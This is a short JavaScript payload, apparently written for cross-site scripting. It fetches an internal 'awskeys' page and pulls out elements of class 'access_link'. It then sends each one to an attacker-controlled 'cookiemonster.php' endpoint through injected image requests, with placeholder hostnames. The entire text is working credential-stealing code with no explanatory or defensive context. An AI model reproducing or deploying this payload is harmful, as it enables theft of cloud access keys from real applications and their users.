async function fetchAsync () 
{
	// Retrieve information from another location
	let response = await fetch("https://__URL__/project/systems/awskeys")
		.then(function (response) { return response.text();} ).then(function (html) {
		// Extract a DOM element
		var parser = new DOMParser();
		var doc = parser.parseFromString(html, 'text/html');
		var cookie = doc.getElementsByClassName('access_link');
		console.log(html)
		for (var i = 0, len = cookie.length; i < len; i++) 
		{
			// Send the info to the server using fetchAsync
			s = document.createElement('img'); 
			s.src='https://__SERVER__/cookiemonster.php?cookie='+cookie[i].innerHTML; 
			document.body.appendChild(s);
			console.log(cookie[i].innerHTML)
		}
	}).catch(function (err) { console.warn('Something went wrong.', err); });
}
fetchAsync()
